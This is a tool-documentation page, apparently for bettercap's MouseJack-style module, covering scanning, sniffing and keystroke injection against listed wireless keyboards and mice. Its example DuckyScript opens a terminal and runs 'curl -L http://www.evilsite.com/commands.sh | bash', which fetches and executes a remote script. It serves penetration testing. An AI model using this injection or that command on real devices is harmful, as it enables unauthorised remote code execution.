---
title: "HID on 2.4Ghz"
date: 2019-02-25T11:10:28+01:00
draft: false
weight: 4
---

This module, which is a port of [Bastille's mousejack attack](https://www.mousejack.com/), performs scanning and frames injection for HID devices on the 2.4Ghz spectrum, using Nordic Semiconductor nRF24LU1+ based USB dongles and Bastille's [RFStorm firmware](https://github.com/BastilleResearch/nrf-research-firmware).

The module will work with one of the devices supported by RFStorm:

* CrazyRadio PA USB dongle
* SparkFun nRF24LU1+ breakout board
* Logitech Unifying dongle (model C-U0007, Nordic Semiconductor based)

And it is known to support detection and [DuckyScript](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) injection for the following devices:

* Microsoft Wireless Keyboard 800
* Microsoft Wireless Mouse 1000
* Microsoft Wireless Mobile Mouse 3500
* Microsoft All-In-One Media Keyboard
* Microsoft Sculpt Ergonomic Mouse
* Logitech Wireless Touch Keyboard K400r
* Logitech Marathon M705 Mouse
* Logitech Wave M510 Mouse
* Logitech Wireless Gaming Mouse G700s
* Logitech Wireless M325 Mouse
* Logitech K750 Wireless Keyboard
* Logitech K320 Wireless Keyboard
* Dell KM636 Wireless Mouse and Keyboard
* AmazonBasics MG-0975 Wireless Mouse

**Commands**

| command | description |
|---------|-------------|
| `hid.recon on` | Start scanning for HID devices on the 2.4Ghz spectrum. |
| `hid.recon off` | Stop scanning for HID devices on the 2.4Ghz spectrum. |
| `hid.show` | Show a list of detected HID devices on the 2.4Ghz spectrum. |
| `hid.sniff ADDRESS` | Start sniffing a specific ADDRESS in order to collect payloads, use 'clear' to stop collecting. |
| `hid.inject ADDRESS LAYOUT FILENAME` | Parse the DuckyScript `FILENAME` and inject it as HID frames spoofing the device `ADDRESS`, using the `LAYOUT` keyboard mapping (available layouts: `BE BR CA CH DE DK ES FI FR GB HR IT NO PT RU SI SV TR US`). |

**Parameters**

| parameter | default | description |
|-----------|---------|-------------|
| `hid.lna` | `true` | If true, enable the LNA power amplifier for CrazyRadio devices. |
| `hid.hop.period` | `100` | Time in milliseconds to stay on each channel before hopping to the next one. |
| `hid.ping.period` | `100` | Time in milliseconds to attempt to ping a device on a given channel while in sniffer mode. |
| `hid.sniff.period` | `500` | Time in milliseconds to automatically sniff payloads from a device, once it's detected, in order to determine its type. |
| `hid.show.filter` | | Defines a regular expression filter for `hid.show`. |
| `hid.show.sort` | `mac desc` | Defines sorting field (mac, seen) and direction (asc or desc) for `hid.show`. |
| `hid.show.limit` | `0` | Defines limit for `hid.show`. | 

**Examples**

Enable HID discovery, use the `ticker` module to display detected devices, wait for the device `32:26:9f:a4:08` to be detected and inject the `ducky.txt` script as HID frames using the US keyboard layout:
    
    > set ticker.commands clear; hid.show; events.show 10
    > hid.recon on
    > ticker on
    ... wait for the device to be detected, using hid.show ...
    > hid.inject 32:26:9f:a4:08 US ducky.txt

Example `ducky.txt` (for a complete list of available commands [see the documentation](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript):

	GUI SPACE
	DELAY 200
	STRING Terminal
	ENTER
	DELAY 500
	STRING curl -L http://www.evilsite.com/commands.sh | bash
	ENTER

